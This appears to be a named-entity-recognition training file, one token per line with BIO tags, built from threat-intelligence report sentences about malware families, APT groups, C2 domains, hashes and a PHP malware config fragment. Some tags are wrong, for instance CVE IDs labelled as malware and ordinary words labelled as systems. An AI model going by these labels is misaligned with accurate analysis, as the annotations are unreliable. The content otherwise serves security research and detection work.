behavior	O
of	O
the	O
malware	O
.	O

Figure	O
2	O
.	O

We	O
published	O
our	O
list	O
of	O
servers	O
in	O
late	O
August	O
2012	O
,	O
in	O
addition	O
to	O
an	O
analysis	O
of	O
mobile	O
phone	O
versions	O
of	O
FinSpy	B-Malware
.	O

Figure	O
1	O
shows	O
a	O
sample	O
email	O
,	O
and	O
Figure	O
2	O
show	O
the	O
contents	O
of	O
the	O
HTML	O
file	O
.	O

<	O
?	O
php	O
$	O
uninstall	O
=	O
false	O
;	O
//true	O
to	O
uninstall	O
$	O
buninstall_id	O
=	O
false	O
;	O
//true	O
to	O
uninstall	O
from	O
ID	O
$	O
uninstall_id	O
=	O
'	O
0C124D55	O
'	O
;	O
//ID	O
to	O
uninstall	O
in	O
hex	O
//	O
$	O
uninstall	O
=	O
true	O
;	O
$	O
debug	O
=	O
false	O
;	O
//true	O
to	O
see	O
errors	O
messages	O
FOR	O
TEST	O
ONLY	O
!	O
!	O

Table	O
1	O
.	O

The	O
actual	O
espionage	O
team	O
voluntary	O
chose	O
to	O
use	O
a	O
kind	O
of	O
usual	O
and	O
rather	O
simply	O
botnet	B-Malware
malware	O
in	O
order	O
to	O
distract	O
analysts	O
from	O
seeing	O
a	O
deeper	O
meaning	O
behind	O
this	O
attack	O
and	O
make	O
them	O
disregard	O
it	O
as	O
'	O
daily	O
cybercrime	O
business	O
'	O
.	O

To	O
do	O
The	O
attacker	O
's	O
purpose	O
appears	O
to	O
deploy	O
malicious	O
apps	O
onto	O
the	O
13	O
compromised	O
devices	O
.	O

36	O
.	O

Koadic	B-Malware
commands	O
and	O
output	O
when	O
ANEL	B-Malware
5.1.2	B-Version
rc1	O
is	O
used	O

All	O
rights	O
reserved	O
.	O

Among	O
them	O
were	O
high	O
ranking	O
diplomats	O
at	O
Israel	O
's	O
Ministry	O
of	O
Foreign	O
Affairs	O
and	O
some	O
well-known	O
Israeli	O
academic	O
researchers	O
specializing	O
in	O
Middle	O
East	O
Studies	O
.	O

Recently	O
it	O
was	O
under	O
the	O
attack	O
exploiting	O
0-day	O
vulnerabilities	O
CVE-2018-8174	B-Malware
.	O

AdvProv.dll	O
is	O
a	O
plug-in	O
to	O
expand	O
functions	O
of	O
Asruex	B-Malware
.	O

'	O
Attribution	O
'	O
is	O
notoriously	O
difficult	O
,	O
with	O
the	O
added	O
difficulty	O
that	O
skilled	O
hackers	O
can	O
easily	O
fake	O
clues	O
or	O
evidence	O
to	O
throw	O
people	O
off	O
their	O
tail	O
.	O

For	O
instance	O
,	O
the	O
'	O
qPd0aKJu.vbs	B-Version
'	O
file	O
MD5	O
:	O

The	O
owner	O
of	O
the	O
Gmail	O
account	O
has	O
developed	O
a	O
flashlight	O
app	O
.	O

Version	O
Description	O

WireShark	B-System
can	O
be	O
used	O
to	O
identify	O
malicious	O
traffic	O
originating	O
on	O
your	O
computer	O
.	O

'	O
Russian	O
Hackers	O
Suspected	O
in	O
French	O
TV	O
Cyberattack	O
.	O
'	O

Ultimately	O
,	O
the	O
module	O
encodes	O
the	O
result	O
with	O
base64	O
and	O
sends	O
it	O
to	O
the	O
C	O
&	O
C	O
server	O
in	O
a	O
POST	O
request	O
.	O

Example	O
observables	O
include	O
:	O
Use	O
of	O
Newly	O
Registered	O
and	O
Low	O
Reputation	O
Infrastructure	O
:	O
The	O
domains	O
utilized	O
in	O
this	O
attack	O
chain	O
are	O
very	O
recently	O
registered	O
domains	O
(	O
Figure	O
12	O
)	O
and	O
leverage	O
low	O
reputation	O
hosting	O
providers	O
and	O
registars	O
that	O
commonly	O
host	O
malicious	O
sites	O
.	O

The	O
dropper	O
in	O
this	O
campaign	O
exploited	O
a	O
known	O
Ghostscript	O
vulnerability	O
,	O
CVE-2017-8291	B-Malware
.	O

North	O
Korea	O
also	O
utilized	O
Bitcoin	O
for	O
the	O
global	O
WannaCry	B-Malware
ransomware	O
attack	O
in	O
mid-May	O
,	O
forcing	O
victims	O
to	O
pay	O
ransom	O
in	O
Bitcoin	O
.	O

Our	O
threat	O
intelligence	O
systems	O
picked	O
up	O
the	O
fi	O
rst	O
indicators	O
of	O
compromise	O
in	O
July	O
last	O
year	O
,	O
and	O
we	O
have	O
kept	O
an	O
eye	O
on	O
the	O
threat	O
ever	O
since	O
.	O

The	O
attacker	O
can	O
reprogram	O
the	O
SIS	O
logic	O
to	O
allow	O
unsafe	O
conditions	O
to	O
persist	O
.	O

>	O

Malaysia	O
Air	O
Flight	O
MH17	O
destroyed	O
by	O
pro-Russian	O
Separatists	O
Minsk	O
I	O
Ceasefire	O
Signed	O
Video	O
depicting	O
use	O
of	O
30	O
application	O
in	O
eastern	O
Ukraine	O
Pro-Russian	O
forces	O
begin	O
government	O
resources	O
in	O
Eastern	O
Ukraine	O
Earliest	O
public	O
reporting	O
on	O
the	O
Android	O
App	O
developed	O
by	O
the	O
Ukrainian	O
soldier	O
Intrusion	O
against	O
Ukraine	O
's	O
Central	O
Election	O
Commission	O
CyberBerkut	O
Releases	O
Info	O
Associated	O
With	O
Claimed	O
Intrusion	O
into	O
Ukraine	O
's	O
Security	O
Service	O
SBU	O
CyberBerkut	O
Defaces	O
Bellingcat	O
Website	O
Cyber	O
attacks	O
against	O
Ukrainian	O
power	O
stations	O
Attack	O
on	O
Kiev	O
Airport	O
System	O

b4ab538f592082373e9ab96373561713	B-Indicator

Gathering	O
data	O
from	O
existing	O
APT	O
reports	O
we	O
automated	O
gathering	O
of	O
historical	O
data	O
from	O
known	O
APT	O
domains	O
from	O
the	O
Passive	B-System
Total	O
API	O
and	O
comparison	O
with	O
the	O
historical	O
data	O
from	O
Operational	B-Malware
Manul	I-Malware
domains	O
.	O

JRat	B-Malware
Controller	O
screen	O
for	O
an	O
infected	O
host	O

Ravand	O
Cybertech	O
has	O
strong	O
ties	O
to	O
the	O
Iranian	O
regime	O
.	O

One	O
can	O
only	O
speculate	O
on	O
who	O
these	O
submitters	O
are	O
.	O

The	O
first	O
backdoor	O
that	O
the	O
TeleBots	O
group	O
relied	O
heavily	O
on	O
was	O
Python/TeleBot.A	B-Malware
,	O
which	O
was	O
rewritten	O
from	O
Python	O
in	O
the	O
Rust	O
programming	O
language	O
.	O

This	O
method	O
probably	O
is	O
used	O
to	O
evade	O
detection	O
by	O
AV	O
software	O
,	O
gateway	O
firewalls	O
and	O
malware	O
sandboxes	O
.	O

Exploit	O
Document	O
Filename	O
:	O
Decoy	O
Document	O
Title	O
:	O

The	O
dropper	O
will	O
delete	O
itself	O
at	O
the	O
end	O
of	O
the	O
process	O
.	O

In	O
a	O
report	O
that	O
covers	O
other	O
parts	O
of	O
the	O
campaign	O
,	O
Mcafee	O
attribute	O
it	O
to	O
Gaza	O
Cybergang	O
(	O
AKA	O
Gaza	O
Hacker	O
Team	O
AKA	O
Molerats	O
)	O
.	O

Finally	O
it	O
spawns	O
2	O
system	O
threads	O
.	O

IoT	O
hacks	O
,	O
and	O
operational	O
disruptions	O
.	O

The	O
packets	O
passed	O
between	O
the	O
two	O
endpoints	O
consist	O
of	O
two	O
fi	O
elds	O
,	O
but	O
lack	O
the	O
plaintext	O
header	O
that	O
was	O
typical	O
of	O
Gh0st	B-Malware
RAT	I-Malware
in	O
previous	O
versions	O
:	O
1	O
.	O

If	O
a	O
matching	O
directory	O
is	O
found	O
,	O
the	O
dropper	O
does	O
not	O
attempt	O
to	O
deploy	O
the	O
scada.exe	B-Malware
payload	O
.	O

Hwp.exe	O
'	O
with	O
.HWP	O
documents	O
.	O

dwPktSize	B-Indicator
parameter	O
.	O

T	O
he	O
first	O
instructions	O
in	O
the	O
mapped	O
thumb.db	O
are	O
for	O
a	O
new	O
shikata_	O
ga_	O
nai	O
iteration	O
.	O

This	O
is	O
a	O
MINGW	O
C++	O
keylogger	O
,	O
hosted	O
at	O
:	O

This	O
further	O
validates	O
our	O
scanning	O
results	O
,	O
and	O
calls	O
into	O
question	O
Gamma	O
's	O
claim	O
that	O
such	O
servers	O
are	O
'	O
not	O
...	O
from	O
the	O
FinFisher	B-Malware
product	O
line	O
.	O
'	O

SMB	O
hacking	O
tools	O
:	O
Used	O
in	O
conjunction	O
with	O
other	O
tools	O
to	O
traverse	O
target	O
networks	O
.	O

It	O
looks	O
like	O
the	O
Darkhotel	B-Malware
APT	O
may	O
have	O
been	O
using	O
the	O
leaked	O
HackingTeam	B-System
Flash	B-System
0day	B-Version
to	O
target	O
specific	O
systems	O
.	O

After	O
a	O
successful	O
login	O
,	O
the	O
controller	O
returns	O
an	O
acknowledgment	O
to	O
the	O
victim	O
with	O
the	O
correct	O
header	O
using	O
the	O
packet	O
flag	O
which	O
it	O
is	O
programmed	O
to	O
verify	O
,	O
as	O
seen	O
in	O
Figure	O
2	O
.	O

Reports	O
of	O
the	O
group	O
's	O
activity	O
in	O
Asia	O
date	O
back	O
to	O
2012	O
,	O
attacking	O
Chinese	O
entities	O
.	O

The	O
other	O
malware	O
family	O
used	O
in	O
this	O
campaign	O
is	O
the	O
commercially	O
available	O
RAT	B-Malware
known	O
as	O
'	O
Bandook	B-Malware
.	O
'	O

In	O
recent	O
weeks	O
,	O
Unit	O
42	O
has	O
been	O
analyzing	O
delivery	O
documents	O
used	O
in	O
spear-phishing	O
attacks	O
that	O
drop	O
a	O
custom	O
downloader	O
used	O
in	O
cyber	O
espionage	O
attacks	O
.	O

The	O
hook	O
installed	O
by	O
ZxShell	B-Malware
implements	O
one	O
of	O
its	O
filtering	O
routine	O
.	O

A	O
similar	O
service	O
,	O
vicp.net	O
,	O
is	O
also	O
seen	O
in	O
many	O
of	O
the	O
domains	O
.	O

On	O
a	O
Windows	B-System
machine	O
,	O
the	O
netsvc	O
group	O
contains	O
names	O
of	O
both	O
existing	O
and	O
non-existing	O
services	O
.	O

This	O
document	O
contains	O
additional	O
Comment	O
Crew	O
indicators	O
of	O
compromise	O
that	O
were	O
seen	O
in	O
the	O
past	O
year	O
.	O

The	O
following	O
is	O
an	O
example	O
of	O
one	O
of	O
these	O
functions	O
–	O
note	O
it	O
even	O
has	O
string	O
references	O
to	O
the	O
source	O
code	O
file	O
name	O
.	O

In	O
the	O
latest	B-Version
version	O
of	O
the	O
dropper	B-System
,	O
the	O
lure	O
pdf	O
is	O
saved	O
to	O
the	O
user	O
's	O
%	O
TEMP	O
%	O
folder	O
with	O
an	O
'	O
~st	O
'	O
prefix	O
and	O
random	O
number	O
,	O
followed	O
by	O
a	O
'	O
.pdf	O
'	O
extension	O
.	O

Interestingly	O
,	O
the	O
binary	O
contains	O
a	O
lot	O
of	O
verbose	O
error	O
messages	O
,	O
allowing	O
us	O
to	O
see	O
Dino	B-Malware
's	O
developers	O
'	O
choice	O
of	O
wording	O
.	O

At	O
the	O
moment	O
,	O
Avast	O
is	O
one	O
of	O
few	O
mobile	O
antivirus	O
providers	O
detecting	O
the	O
threat	O
.	O

Though	O
the	O
data	O
of	O
module	O
3	O
started	O
with	O
'	O
MZ	O
'	O
,	O
it	O
does	O
not	O
belong	O
to	O
PE	O
files	O
.	O

Even	O
though	O
the	O
targets	O
that	O
are	O
known	O
by	O
now	O
are	O
rather	O
high-level	O
targets	O
,	O
the	O
malware	O
code	O
as	O
well	O
as	O
its	O
features	O
is	O
not	O
advanced	O
.	O

New	O
Countries	O

Minerva	B-System
brings	O
a	O
completely	O
new	O
paradigm	O
to	O
the	O
malware	O
detection	O
problem	O
,	O
focusing	O
on	O
preventing	O
malware	O
execution	O
by	O
using	O
the	O
malware	O
's	O
strengths	O
against	O
it	O
.	O

In	O
terms	O
of	O
the	O
size	O
of	O
the	O
infrastructure	O
used	O
in	O
the	O
campaign	O
using	O
the	O
tools	O
described	O
,	O
it	O
's	O
also	O
fairly	O
small	O
,	O
as	O
shown	O
on	O
our	O
Maltego	O
graph	O
.	O

Users	O
can	O
protect	O
themselves	O
from	O
such	O
attacks	O
by	O
disabling	O
Office	O
macros	O
in	O
their	O
settings	O
and	O
also	O
by	O
being	O
more	O
vigilant	O
when	O
enabling	O
macros	O
(	O
especially	O
when	O
prompted	O
)	O
in	O
documents	O
,	O
even	O
if	O
such	O
documents	O
are	O
from	O
seemingly	O
trusted	O
sources	O
.	O

Thus	O
,	O
social	O
engineering	O
techniques	O
would	O
be	O
involved	O
.	O

Data	O
.....	O
data.i	O
6d	O
61	O
67	O
65	O
05	O
62	O
79	O
74	O
65	O
73	O
01	O
02	O
02	O
02	O
00	O
00	O
mage.bytes	O
......	O
00	O
06	O
03	O
00	O
00	O
00	O
64	O
31	O
30	O
32	O
36	O
32	O
32	O
30	O
32	O
31	O
......	O
d102622021	O
46	O
32	O
30	O
30	O
33	O
32	O
34	O
30	O
33	O
30	O
30	O
33	O
36	O
32	O
44	O
36	O
F2003240300362D6	O
34	O
33	O
38	O
30	O
42	O
34	O
33	O
35	O
37	O
31	O
30	O
31	O
36	O
33	O
31	O
33	O
4380B43571016313	O
44	O
33	O
39	O
30	O
30	O
32	O
45	O
32	O
31	O
30	O
36	O
30	O
38	O
30	O
43	O
30	O
D39002E2106080C0	O
46	O
32	O
35	O
33	O
38	O
30	O
37	O
30	O
38	O
30	O
35	O
37	O
41	O
37	O
35	O
33	O
F25380708057A753	O
33	O
30	O
44	O
37	O
37	O
32	O
36	O
33	O
35	O
33	O
31	O
36	O
39	O
33	O
45	O
34	O
30D77263531693E4	O
34	O
37	O
45	O
31	O
35	O
35	O
38	O
37	O
38	O
35	O
43	O
0a	O
0a	O
0b	O
47E1558785C	O
...	O

Across	O
the	O
stages	O
of	O
these	O
campaigns	O
,	O
we	O
have	O
observed	O
the	O
use	O
of	O
several	O
tactics	O
and	O
techniques	O
to	O
evade	O
detection	O
and	O
deliver	O
the	O
malicious	O
payload	O
.	O

This	O
is	O
a	O
driver	O
file	O
which	O
loads	O
a	O
main	O
module	O
designed	O
as	O
an	O
encrypted	O
library	O
.	O

checkFolders	O

ComServer6	O
:	O
hXXp://dneprorudnoe.info//...	O
[	O
]	O
...	O
/postal.php	O
STR	O

2b8c79678fa970ca4e229121e3de206f	B-Indicator
5e4b7268606d6c98d00874431d39c34971149200	B-Indicator

Our	O
detection	O
is	O
Android	O
:	O
SpyAgent-YP	O
[	O
Trj	O
]	O
.	O

There	O
is	O
strong	O
evidence	O
of	O
a	O
Vietnamese	O
FinSpy	B-Malware
Mobile	O
Campaign	O
.	O

•	O
Ensure	O
that	O
you	O
are	O
progressing	O
towards	O
being	O
able	O
to	O
attest	O
against	O
the	O
SWIFT	O
27	O
controls	O
.	O

Notice	O
the	O
'	O
$	O
DoIt	O
'	O
string	O
,	O
which	O
is	O
usually	O
indicative	O
of	O
a	O
Cobalt	O
Strike	O
payload	O
.	O

Web	O
.	O

return	O
0	O
;	O
32	O
}	O

McAfee	B-Organization
Vulnerability	B-System
Coverage	O
not	O
warranted	O
at	O
this	O
time	O
MNAC	O
2.x	B-Version
Coverage	O
not	O
warranted	O
at	O
this	O
time	O
McAfee	B-Organization
Remediation	O
Malware	O
coverage	O
is	O
out	O
of	O
scope	O
.	O

After	O
acquiring	O
the	O
MFT	O
using	O
FTK	O
,	O
EnCase	O
,	O
or	O
other	O
means	O
,	O
FireEye	O
recommends	O
using	O
mftdump	O
.	O

These	O
tools	O
are	O
used	O
to	O
further	O
compromise	O
the	O
organization	O
by	O
attacking	O
other	O
hosts	O
inside	O
the	O
targets	O
network	O
.	O

APT28	B-Malware
gains	O
access	O
to	O
an	O
International	O
Olympic	O
Committee	O
account	O
created	O
specifically	O
for	O
the	O
2016	O
Olympic	O
Games	O
,	O
and	O
views	O
and	O
downloads	O
athlete	O
data	O
.	O

2016	O
.	O

This	O
payload	O
is	O
available	O
in	O
a	O
variety	O
of	O
languages	O
such	O
as	O
ASP	O
,	O
ASPX	O
,	O
PHP	O
,	O
JSP	O
,	O
and	O
CFM	O
.	O

https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8174	B-Indicator
360	O
Helios	O
Team	O
is	O
the	O
APT	O
(	O
Advanced	O
Persistent	O
Attack	O
)	O
research	O
and	O
analysis	O
team	O
in	O
Qihoo	B-Organization
360	B-System
.	O

There	O
are	O
a	O
lot	O
of	O
versions	O
available	O
in	O
the	O
underground	O
market	O
.	O

Table	O
5	O
:	O
'	O
system_web.aspx	B-Malware
'	O
Authentication	O
Code	O
First	O
,	O
the	O
code	O
checks	O
if	O
a	O
cookie	O
by	O
the	O
name	O
of	O
cp	O
exists	O
.	O

Among	O
them	O
is	O
SecurityPasswordAES	O
.	O

If	O
you	O
are	O
interested	O
in	O
reading	O
more	O
about	O
the	O
BlackEnergy	O
APT	O
,	O
be	O
sure	O
to	O
check	O
our	O
previous	O
blogs	O
on	O
the	O
topic	O
:	O
Going	O
back	O
to	O
the	O
hunt	O
for	O
similarities	O
,	O
here	O
's	O
how	O
the	O
targeted	O
extensions	O
lists	O
looks	O
in	B-System
ExPetr	O
and	O
a	O
version	O
of	O
a	O
wiper	O
used	O
by	O
the	O
BE	O
APT	O
group	O
in	O
2015	O
:	O
ExPetr	O
2015	O
BlackEnergy	O
wiper	O
sample	O
3ds	O
,	O
.7z	O
,	O
.accdb	O
,	O
.ai	O
,	O
.asp	O
,	O
.aspx	O
,	O
.avhd	O
,	O
.back	O
,	O
.bak	O
,	O
.c	O
,	O
.cfg	O
,	O
.conf	O
,	O
.cpp	O
,	O
.cs	O
,	O
.ctl	O
,	O
.dbf	O
,	O
.disk	O
,	O
.djvu	O
,	O
.doc	O
,	O
.docx	O
,	O
.dwg	O
,	O
.eml	O
,	O
.fdb	O
,	O
.gz	O
,	O
.h	O
,	O
.hdd	O
,	O
.kdbx	O
,	O
.mail	O
,	O
.mdb	O
,	O
.msg	O
,	O
.nrg	O
,	O
.ora	O
,	O
.ost	O
,	O
.ova	O
,	O
.ovf	O
,	O
.pdf	O
,	O
.php	O
,	O
.pmf	O
,	O
.ppt	O
,	O
.pptx	O
,	O
.pst	O
,	O
.pvi	O
,	O
.py	O
,	O
.pyc	O
,	O
.rar	O
,	O
.rtf	O
,	O
.sln	O
,	O
.sql	O
,	O
.tar	O
,	O
.vbox	O
,	O
.vbs	O
,	O
.vcb	O
,	O
.vdi	O
,	O
.vfd	O
,	O
.vmc	O
,	O
.vmdk	O
,	O
.vmsd	O
,	O
.vmx	O
,	O
.vsdx	O
,	O
.vsv	O
,	O
.work	O
,	O
.xls	O
.3ds	O
,	O
.7z	O
,	O
.accdb	O
,	O
.accdc	O
,	O
.ai	O
,	O
.asp	O
,	O
.aspx	O
,	O
.avhd	O
,	O
.back	O
,	O
.bak	O
,	O
.bin	O
,	O
.bkf	O
,	O
.cer	O
,	O
.cfg	O
,	O
.conf	O
,	O
.crl	O
,	O
.crt	O
,	O
.csr	O
,	O
.csv	O
,	O
.dat	O
,	O
.db3	O
,	O
.db4	O
,	O
.dbc	O
,	O
.dbf	O
,	O
.dbx	O
,	O
.djvu	O
,	O
.doc	O
,	O
.docx	O
,	O
.dr	O
,	O
.dwg	O
,	O
.dxf	O
,	O
.edb	O
,	O
.eml	O
,	O
.fdb	O
,	O
.gdb	O
,	O
.git	O
,	O
.gz	O
,	O
.hdd	O
,	O
.ib	O
,	O
.ibz	O
,	O
.io	O
,	O
.jar	O
,	O
.jpeg	O
,	O
.jpg	O
,	O
.jrs	O
,	O
.js	O
,	O
.kdbx	O
,	O
.key	O
,	O
.mail	O
,	O
.max	O
,	O
.mdb	O
,	O
.mdbx	O
,	O
.mdf	O
,	O
.mkv	O
,	O
.mlk	O
,	O
.mp3	O
,	O
.msi	O
,	O
.my	O
,	O
.myd	O
,	O
.nsn	O
,	O
.oda	O
,	O
.ost	O
,	O
.ovf	O
,	O
.p7b	O
,	O
.p7c	O
,	O
.p7r	O
,	O
.pd	O
,	O
.pdf	O
,	O
.pem	O
,	O
.pfx	O
,	O
.php	O
,	O
.pio	O
,	O
.piz	O
,	O
.png	O
,	O
.ppt	O
,	O
.pptx	O
,	O
.ps	O
,	O
.ps1	O
,	O
.pst	O
,	O
.pvi	O
,	O
.pvk	O
,	O
.py	O
,	O
.pyc	O
,	O
.rar	O
,	O
.rb	O
,	O
.rtf	O
,	O
.sdb	O
,	O
.sdf	O
,	O
.sh	O
,	O
.sl3	O
,	O
.spc	O
,	O
.sql	O
,	O
.sqlite	O
,	O
.sqlite3	O
,	O
.tar	O
,	O
.tiff	O
,	O
.vbk	O
,	O
.vbm	O
,	O
.vbox	O
,	O
.vcb	O
,	O
.vdi	O
,	O
.vfd	O
,	O
.vhd	O
,	O
.vhdx	O
,	O
.vmc	O
,	O
.vmdk	O
,	O
.vmem	O
,	O
.vmfx	O
,	O
.vmsd	O
,	O
.vmx	O
,	O
.vmxf	O
,	O
.vsd	O
,	O
.vsdx	O
,	O
.vsv	O
,	O
.wav	O
,	O
.wdb	O
,	O
.xls	O
,	O
.xlsx	O
,	O
.xvd	O
,	O
.zip	O
Obviously	O
,	O
the	O
lists	O
are	O
similar	O
in	O
composition	O
and	O
formatting	O
,	O
but	O
not	O
identical	O
.	O

If	O
an	O
unknown	O
individual	O
claims	O
to	O
be	O
from	O
a	O
legitimate	O
organization	O
,	O
try	O
to	O
verify	O
his	O
or	O
her	O
identity	O
directly	O
with	O
the	O
company	O
.	O

e2627a887898b641db720531258fd133	O

Public	O
disclosures	O
may	O
result	O
in	O
an	O
immediate	O
change	O
in	O
APT12	O
's	O
tools	O
.	O

This	O
2nd	O
stage	O
payload	O
DLL	O
contained	O
within	O
the	O
assembly	O
is	O
30,720	O
bytes	O
in	O
size	O
and	O
encoded	O
with	O
XOR	O
56	O
:	O

'	O
e53bd956c4ef79d54b4860e74c68e6d93a49008034afb42b092ea19344309914.exe	O
'	O

The	O
handshake	O
begins	O
when	O
the	O
client	O
sends	O
a	O
64	O
byte	O
random	O
buffer	O
with	O
the	O
3	O
(	O
offset	O
12	O
)	O
and	O
8	O
(	O
offset	O
32	O
)	O
DWORDs	O
defined	O
as	O
:	O

It	O
is	O
obvious	O
that	O
rtniczw.sys	O
was	O
intended	O
for	O
some	O
other	O
use	O
.	O

This	O
is	O
also	O
the	O
case	O
of	O
a	O
custom-built	O
piece	O
of	O
malware	O
that	O
we	O
have	O
been	O
monitoring	O
for	O
several	O
months	O
as	O
it	O
wrought	O
havoc	O
in	O
Asia	O
.	O

While	O
we	O
do	O
not	O
have	O
any	O
knowledge	O
of	O
who	O
the	O
actual	O
Lazarus	O
attackers	O
are	O
,	O
the	O
data	O
collected	O
from	O
the	O
backend	O
systems	O
gives	O
us	O
some	O
insights	O
into	O
the	O
internet	O
usage	O
patterns	O
of	O
systems	O
likely	O
owned	O
by	O
Lazarus	O
group	O
members	O
.	O

Starts	O
in	O
Function	O
:	O
cef_initialize	O

When	O
Unit	O
42	O
used	O
the	O
Palo	B-Organization
Alto	O
Networks	O
AutoFocus	O
threat	O
intelligence	O
service	O
to	O
locate	O
additional	O
Cmstar	B-Malware
samples	O
,	O
we	O
found	O
several	O
with	O
C2	O
domains	O
that	O
also	O
had	O
the	O
same	O
original	O
registrant	O
:	O
links.dogsforhelp[.]com	B-Indicator
three.earewq[.]com	B-Indicator
question.eboregi[.]com	B-Indicator
here.pechooin[.]com	B-Indicator
sarey.phdreport[.]com	B-Indicator
bakler.featurvoice[.]com	B-Indicator
The	O
only	O
known	O
Cmstar	B-Malware
C2	O
domain	O
not	O
initially	O
registered	O
by	O
the	O
email	O
address	O
was	O
help.ubxpi0s[.]com	B-Indicator
.	O

Copy	O
the	O
DLL	O
file	O
in	O
the	O
AppData	O
directory	O
to	O
the	O
System32	O
directory	O
through	O
the	O
COM	O
interface	O
and	O
name	O
it	O
msfte.dll	O
and	O
NTWDBLIB.dll	O
.	O

After	O
this	O
is	O
complete	O
you	O
will	O
be	O
able	O
to	O
add	O
the	O
image	O
into	O
the	O
forensic	O
program	O
.	O

In	O
every	O
case	O
we	O
have	O
found	O
,	O
the	O
main	O
component	O
is	O
a	O
DLL	O
dropped	O
by	O
an	O
executable	O
compiled	O
minutes	O
after	O
the	O
DLL	O
.	O

WindowsDefender.ini	B-System
–	O
The	O
Base64	O
encoded	O
and	O
obfuscated	O
PowerShell	O
script	O
.	O

However	O
,	O
no	O
public	O
analysis	O
reports	O
of	O
SOUNDBITE	B-Malware
is	O
available	O
to	O
the	O
time	O
of	O
writing	O
this	O
report	O
.	O

The	O
new	O
xor	O
encoding	O
byte	O
is	O
0x5B	B-Version
.	O

Each	O
of	O
those	O
commands	O
can	O
take	O
one	O
or	O
more	O
arguments	O
.	O

To	O
copy	O
memory	O
,	O
the	O
memcpy	O
function	O
is	O
invoked	O
.	O

https://github.com/fireeye/tools/tree/master/malware/Xtreme	B-Indicator
%	I-Indicator
20RAT	I-Indicator

No	O
public	O
analysis	O
was	O
found	O
except	O
the	O
mention	O
in	O
Kaspersky	O
's	O
report	O
of	O
a	O
custom	O
backdoor	O
,	O
so	O
CIRCL	O
took	O
one	O
of	O
the	O
known	O
samples	O
and	O
started	O
this	O
analysis	O
.	O

According	O
to	O
Sherstuk	O
's	O
interviews	O
with	O
the	O
press	O
,	O
over	O
9000	O
artillery	O
personnel	O
have	O
been	O
using	O
the	O
application	O
in	O
Ukrainian	O
military	O
.	O

The	O
analysts	O
involved	O
were	O
able	O
to	O
identify	O
command	O
and	O
control	O
(	O
C2	O
)	O
servers	O
,	O
dropper	O
and	O
installation	O
methods	O
,	O
means	O
of	O
persistence	O
,	O
and	O
identify	O
the	O
attack	O
tools	O
that	O
are	O
core	O
to	O
the	O
RAT	B-Malware
's	O
purpose	O
.	O

In	O
order	O
to	O
establish	O
a	O
valid	O
communication	O
channel	O
between	O
the	O
server	O
variant	O
and	O
a	O
controlling	O
client	O
,	O
a	O
specific	O
handshake	O
is	O
required	O
.	O

So	O
,	O
even	O
more	O
interesting	O
than	O
the	O
shift	O
eastward	O
and	O
other	O
targeting	O
overlap	O
,	O
is	O
that	O
the	O
specific	O
target	O
system	O
in	O
China	O
was	O
previously	O
a	O
Grey	O
Lambert	O
target	O
.	O

While	O
this	O
may	O
be	O
a	O
possibility	O
,	O
at	O
present	O
there	O
is	O
n't	O
enough	O
evidence	O
to	O
support	O
that	O
hypothesis	O
.	O

File	O
Name	O
:	O
netsat.exe	O
File	O
Size	O
:	O
43520	O
bytes	O
MD5	O
:	O
eb8399483b55f416e48a320d68597d72	B-Indicator
Previous	O
analysis	O
results	O
indicated	O
netsat.exe	O
retrieved	O
commands	O
from	O
an	O
encrypted	O
file	O
named	O
netwn.drv	O
resident	O
in	O
the	O
CSIDL_WINDOWS\msagent\	O
directory	O
.	O

The	O
unchecked	O
global	O
proliferation	O
of	O
products	O
like	O
FinFisher	B-Malware
makes	O
a	O
strong	O
case	O
for	O
policy	O
debate	O
about	O
surveillance	O
software	O
and	O
the	O
commercialization	O
of	O
offensive	O
cyber-capabilities	O
.	O

False	O
flags	O
are	O
becoming	O
more	O
common	O
in	O
malware	O
,	O
both	O
sophisticated	O
and	O
simple	O
.	O

As	O
usual	O
,	O
the	O
best	O
defense	O
against	O
targeted	O
attacks	O
is	O
a	O
multi-layered	O
approach	O
.	O

These	O
temporary	O
PRT	O
files	O
are	O
then	O
submitted	O
for	O
printing	O
by	O
using	O
another	O
executable	O
file	O
called	O
nroff.exe	O
,	O
a	O
legitimate	O
tool	O
from	O
the	O
SWIFT	O
software	O
suite	O
.	O

|	O
0000d600	B-Version
65	O
78	O
65	O
00	O
53	O
68	O
61	O
64	O
6f	B-Version
77	O
54	O
65	O
63	O
68	O
20	O
52	O
|	O
exe.ShadowTech	B-Malware
R	I-Malware
|	O
0000d610	B-Version
61	O
74	O
00	O
3c	B-Version
4d	B-Version
6f	B-Version
64	O
75	O
6c	B-Version
65	O
3e	B-Version
00	O
01	O
00	O
03	O
00	O
|	O
at	O
.	O

Re-use	O
of	O
domains	O
and	O
IPs	O
across	O
campaigns	O
-	O
Quite	O
a	O
few	O
domains	O
and	O
IPs	O
that	O
were	O
observed	O
in	O
Operation	O
Cobalt	O
Kitty	O
were	O
found	O
in-the-wild	O
,	O
attacking	O
other	O
targets	O
.	O

It	O
is	O
that	O
hackers	O
are	O
becoming	O
increasingly	O
sophisticated	O
and	O
able	O
to	O
generate	O
new	O
threats	O
faster	O
than	O
ever	O
before	O
.	O

The	O
text-based	O
payload	O
is	O
so	O
simple	O
and	O
short	O
that	O
an	O
attacker	O
could	O
type	O
it	O
by	O
hand	O
right	O
on	O
the	O
target	O
server—no	O
file	O
transfer	O
needed	O
.	O

This	O
is	O
the	O
first	O
time	O
that	O
Bankshot	O
has	O
been	O
tied	O
directly	O
to	O
financial-related	O
hacking	O
and	O
the	O
first	O
time	O
it	O
has	O
been	O
used	O
since	O
November	O
2017	O
.	O

Bot	O
:	O

Figure	O
17	O
:	O
Results	O
of	O
multiple	O
anti-virus	O
engine	O
inspections	O
showing	O
China	O
Chopper	O
coming	O
up	O
clean	O

In	O
this	O
case	O
the	O
available	O
DLLs	O
can	O
have	O
the	O
names	O
:	O
We	O
were	O
able	O
to	O
obtain	O
the	O
first	O
three	O
DLLs	O
,	O
which	O
were	O
located	O
at	O
the	O
URL	O
hxxp://axroot.com/plg10/.	B-Indicator

Attached	O
to	O
this	O
email	O
was	O
a	O
malicious	O
Microsoft	O
Word	O
document	O
(	O
MD5	O
:	O
f6fafb7c30b1114befc93f39d0698560	B-Indicator
)	O
that	O
exploited	O
CVE-2012-0158	B-Malware
.	O

The	O
malware	O
begins	O
by	O
implementing	O
a	O
Trust	O
Manager	O
that	O
accepts	O
all	O
certificates	O
so	O
that	O
Libyan	B-Malware
Scorpions	I-Malware
hackers	O
are	O
sure	O
no	O
victim	O
left	O
disconnected	O
due	O
to	O
SSL	O
certificates	O
issues	O
.	O

